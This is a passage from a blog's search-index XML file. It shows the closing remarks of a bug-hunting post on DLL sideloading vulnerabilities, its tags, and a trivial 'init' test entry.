does not meet their bar for servicing via a monthly security update.</td></tr></tbody></table><h4 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h4><p>As exploitation of these vulnerabilities require either existing system access or social engineering,<br>they are by no means the most critical out there.  However, I feel @n0x00 described it best in a<br>GitHub thread: “it’s the XSS of thick client work”.</p>]]></content>
      
      
      
        <tags>
            
            <tag> bughunting </tag>
            
            <tag> dll </tag>
            
            <tag> sideloading </tag>
            
            <tag> vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>init</title>
      <link href="2020/11/02/init/"/>
      <url>2020/11/02/init/</url>
      
        <content type="html"><![CDATA[<p>Testing / Initial Setup</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
